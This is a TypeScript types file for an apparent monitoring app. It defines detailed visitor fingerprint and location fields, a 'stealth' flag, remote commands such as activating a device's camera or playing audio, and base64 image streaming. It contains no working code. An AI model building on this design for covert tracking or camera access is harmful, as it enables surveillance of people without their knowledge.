
export interface DeviceInfo {
  ip: string;
  userAgent: string;
  platform: string;
  language: string;
  screenWidth: number;
  screenHeight: number;
  vendor: string;
  timestamp: string;
  gpu?: string;
  battery?: number;
  deviceMemory?: number;
  hardwareConcurrency?: number;
  colorDepth?: number;
  maxTouchPoints?: number;
  connectionType?: string;
  timezone?: string;
  onLine?: boolean;
  referrer?: string;
  cookiesEnabled?: boolean;
  pdfViewerEnabled?: boolean;
  coords?: {
    latitude: number;
    longitude: number;
    accuracy: number;
  };
  isStealth?: boolean;
  ipGeo?: {
    city?: string;
    region?: string;
    country?: string;
    isp?: string;
    zip?: string;
    asn?: string;
  };
}

export interface TerminalLog {
  id: string;
  type: 'info' | 'warning' | 'error' | 'success' | 'system';
  message: string;
  timestamp: string;
  link?: string;
}

export type CommandType = 'ACTIVATE_CAMERA' | 'STOP_CAMERA' | 'PING' | 'PLAY_AUDIO' | 'SPEAK' | 'GLITCH' | 'SEND_AURA';

export interface CommandMessage {
  type: CommandType;
  timestamp: string;
  payload?: any;
}

export interface StreamMessage {
  image: string; // Base64
  timestamp: string;
}

export enum AppRoute {
  DASHBOARD = 'dashboard',
  SCANNER = 'scan'
}
